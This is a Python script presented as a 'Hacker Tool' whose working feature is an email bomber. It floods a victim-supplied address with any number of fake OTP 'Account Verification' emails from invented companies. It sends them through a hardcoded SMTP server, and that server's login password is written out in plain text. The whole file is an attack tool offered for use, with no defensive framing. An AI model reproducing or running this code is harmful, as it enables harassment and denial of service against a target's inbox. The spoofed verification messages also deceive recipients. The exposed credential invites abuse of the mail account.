import smtplib
import random
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
import random
import string

# Function to print hacker-style banner
def print_hacker_banner():
    os.system('cls' if os.name == 'nt' else 'clear')  # Only clear at the start
    print("\033[1;31;40m")  # Red color for the banner
    print("""
  ____                  _               
 |  _ \                | |              
 | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  _ < / _ \| '_ ` _ \| '_ \ / _ \ '__|
 | |_) | (_) | | | | | | |_) |  __/ |   
 |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                        
    """)
    print("\033[0m")  # Reset the color after the banner

    # Box with multi-colored text below the banner
    print("\033[1;32;40m")  # Green color for the box
    print("╔═════════════════════════════════════════╗")
    print("\033[1;34;40m" + "║ " + "\033[1;33;40m" + "Author Name : Pak Anonymous" +           "\033[1;34;40m" +           " ║")
    print("\033[1;34;40m" + "║ " + "\033[1;33;40m" + "Whatsapp Number : +923000448415"           + "\033[1;34;40m" +           " ║")
    print("╚═════════════════════════════════════════╝")
    print("\033[0m")  # Reset the color after the box

    print("\033[1;33;40m")
    print("Welcome to the Hacker Tool")
    print("Choose an option:")
    print("1. Email Bomber")
    print("2. SMS Bomber (Dummy)")
    print("3. Exit")
    print("\033[0m")
    time.sleep(1)

# SMTP server details
SMTP_SERVER = 'mail.royalearninghub.click'
SMTP_PORT = 587
SENDER_EMAIL = 'noreply@royalearninghub.click'  # Apna email daalein
SENDER_PASSWORD = '+bUtR?g=)p+2'  # Apna password ya app-specific password

# Function to generate random OTP
def generate_otp():
    otp = ''.join(random.choices(string.digits, k=6))  # Random 6-digit OTP
    return otp

# Function to send email
def send_email(receiver_email, num_emails):
    # List of random companies
    companies = ["TechCorp", "FinSolve", "InnoSys", "XenoTech", "GlobalX", "SoftWare Solutions", "Alpha Inc."]
    
    success_count = 0  # To track the number of successfully sent emails
    failure_count = 0  # To track the number of failed emails
    
    # Start sending emails
    for _ in range(num_emails):
        # Select random company and generate OTP
        company = random.choice(companies)
        otp = generate_otp()
        
        # Generate random email content
        subject = f"Account Verification - {company}"
        body = f"Hello,\n\nPlease verify your account using the following OTP for {company}:\n\nOTP: {otp}\n\nThank you for using our service!"
        
        # Create the email message
        message = MIMEMultipart()
        message['From'] = SENDER_EMAIL
        message['To'] = receiver_email
        message['Subject'] = subject
        
        message.attach(MIMEText(body, 'plain'))
        
        # Connect to the SMTP server
        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()  # Secure connection
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.sendmail(SENDER_EMAIL, receiver_email, message.as_string())
            server.quit()
            print(f"Email sent successfully to {receiver_email} with company {company}")
            success_count += 1  # Increment success counter
        except Exception as e:
            print(f"Failed to send email to {receiver_email} with company {company}. Error: {e}")
            failure_count += 1  # Increment failure counter
    
    # After sending all emails, print the result
    print(f"\nTotal emails sent: {num_emails}")
    print(f"Successfully sent: {success_count}")
    print(f"Failed to send: {failure_count}")
    
    # Provide options to the user
    print("\nChoose an option:")
    print("1. Back")
    print("2. Exit")
    choice = input("Enter your choice: ")
    
    if choice == "1":
        return True  # Go back to the main menu
    elif choice == "2":
        exit()  # Exit the program
    else:
        print("Invalid choice! Exiting...")
        exit()  # Exit if an invalid choice is made

# Main function to handle the user input
def main():
    print_hacker_banner()
    while True:
        choice = input("Enter your choice: ")
        if choice == "1":
            receiver_email = input("Enter the receiver's email: ")
            num_emails = int(input("Enter the number of emails to send: "))
            send_email(receiver_email, num_emails)
        elif choice == "2":
            print("SMS Bomber (Dummy) selected. Exiting...")
            exit()
        elif choice == "3":
            print("Exiting...")
            exit()
        else:
            print("Invalid choice! Please choose again.")

if __name__ == "__main__":
    main()
